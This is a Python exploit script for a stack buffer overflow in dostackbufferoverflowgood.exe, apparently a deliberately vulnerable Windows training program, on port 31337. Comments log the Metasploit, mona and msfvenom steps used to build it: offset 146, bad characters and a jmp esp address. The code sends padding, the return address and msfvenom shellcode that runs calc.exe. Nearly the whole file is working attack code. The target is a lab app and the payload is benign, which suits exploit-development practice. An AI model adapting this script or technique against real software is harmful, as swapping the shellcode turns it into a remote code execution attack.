import socket
import struct
import sys

# [*]Fuzzing 127.0.0.1 31337 with 45302 bytes...
# root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 45300 |xclip -selection clipboard
# root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
# [*] Exact match at offset 146
# badchars = [0x00,0x0a]
# !mona jmp -r esp -cpb "\x00\x0A"
# Log data, item 4 Address=080414C3 Message=  0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\dostackbufferoverflowgood-master\dostackbufferoverflowgood-master\dostackbufferoverflowgood
# Log data, item 3 Address=080416BF Message=  0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\dostackbufferoverflowgood-master\dostackbufferoverflowgood-master\dostackbufferoverflowgood
# msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread

def exploit(ip,port=31337):

	jmp_esp = struct.pack("<I",0x080414c3)

	shellcode =  b"\x90"*30
	shellcode += b"\xd9\xce\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x31"
	shellcode += b"\xba\x16\x95\xd9\xc1\x31\x57\x18\x83\xc7\x04"
	shellcode += b"\x03\x57\x02\x77\x2c\x3d\xc2\xf5\xcf\xbe\x12"
	shellcode += b"\x9a\x46\x5b\x23\x9a\x3d\x2f\x13\x2a\x35\x7d"
	shellcode += b"\x9f\xc1\x1b\x96\x14\xa7\xb3\x99\x9d\x02\xe2"
	shellcode += b"\x94\x1e\x3e\xd6\xb7\x9c\x3d\x0b\x18\x9d\x8d"
	shellcode += b"\x5e\x59\xda\xf0\x93\x0b\xb3\x7f\x01\xbc\xb0"
	shellcode += b"\xca\x9a\x37\x8a\xdb\x9a\xa4\x5a\xdd\x8b\x7a"
	shellcode += b"\xd1\x84\x0b\x7c\x36\xbd\x05\x66\x5b\xf8\xdc"
	shellcode += b"\x1d\xaf\x76\xdf\xf7\xfe\x77\x4c\x36\xcf\x85"
	shellcode += b"\x8c\x7e\xf7\x75\xfb\x76\x04\x0b\xfc\x4c\x77"
	shellcode += b"\xd7\x89\x56\xdf\x9c\x2a\xb3\xde\x71\xac\x30"
	shellcode += b"\xec\x3e\xba\x1f\xf0\xc1\x6f\x14\x0c\x49\x8e"
	shellcode += b"\xfb\x85\x09\xb5\xdf\xce\xca\xd4\x46\xaa\xbd"
	shellcode += b"\xe9\x99\x15\x61\x4c\xd1\xbb\x76\xfd\xb8\xd1"
	shellcode += b"\x89\x73\xc7\x97\x8a\x8b\xc8\x87\xe2\xba\x43"
	shellcode += b"\x48\x74\x43\x86\x2d\x9a\xa1\x03\x5b\x33\x7c"
	shellcode += b"\xc6\xe6\x5e\x7f\x3c\x24\x67\xfc\xb5\xd4\x9c"
	shellcode += b"\x1c\xbc\xd1\xd9\x9a\x2c\xab\x72\x4f\x53\x18"
	shellcode += b"\x72\x5a\x30\xff\xe0\x06\x99\x9a\x80\xad\xe5"

	
	buf = bytearray()
	buf += "a" *146
	buf += jmp_esp
	buf += shellcode
	buf += "c"*(45300 - len(buf))
	buf += "\n"

	print("[*]Sending evil buf {} {} with {} bytes...".format(ip,port,len(buf)))

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,port))
	s.send(buf)
	s.close()

if __name__=="__main__":
	# do magic
	
	usage = "[*]Usage: {} [ip] [port]".format(sys.argv[0])

	if len(sys.argv) != 3:
		print(usage)
		sys.exit()

	ip = sys.argv[1]
	port = sys.argv[2]

	exploit(str(ip),int(port))